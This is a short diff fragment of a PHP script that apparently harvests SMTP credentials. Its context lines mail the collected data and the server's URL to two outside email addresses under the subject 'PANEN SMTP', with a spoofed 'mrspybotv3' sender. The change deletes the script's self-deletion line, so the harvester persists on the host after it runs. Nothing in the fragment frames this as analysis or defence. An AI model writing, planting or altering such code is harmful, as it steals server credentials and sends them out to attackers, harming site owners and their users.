@@ -87,5 +87,4 @@ $tujuanmail = 'sitexploit@gmail.com,buzashop1998@yahoo.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $from = "From: Result<botv3@mrspybotv3.com";
 mail($tujuanmail, "PANEN SMTP", $kirim, $from);
-@unlink(__FILE__);
 ?>
